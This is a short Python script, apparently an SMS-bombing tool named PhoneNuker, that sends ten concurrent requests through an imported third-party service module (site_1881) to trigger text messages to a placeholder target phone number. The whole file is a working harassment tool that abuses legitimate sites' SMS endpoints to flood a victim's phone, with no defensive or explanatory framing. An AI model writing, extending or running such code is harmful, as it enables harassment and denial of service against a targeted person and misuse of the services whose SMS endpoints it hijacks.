import asyncio
import aiohttp

from site_request.site_1881 import request as request_1881

class PhoneNuker:
    def __init__(self):
        self.phone_number = "TARGET_PHONE_NUMBER"  
        self.request_services = [
            request_1881,
        ]

    async def spam_sms_single(self, session, service_index):
        request_class = self.request_services[service_index % len(self.request_services)]
        try:
            request_instance = request_class(self.phone_number, session)
            valid, response, wait_time = await request_instance.send_sms()
            if valid and wait_time is False:
                print(f"Service {service_index}: {response}")
            else:
                print(f"Service {service_index} failed: {response}")
        except Exception as e:
            print(f"Task {service_index} error: {e}")


async def main():
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=10)) as session:
        tasks = [asyncio.create_task(nuker.spam_sms_single(session, i)) for i in range(10)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    nuker = PhoneNuker()
    asyncio.run(main())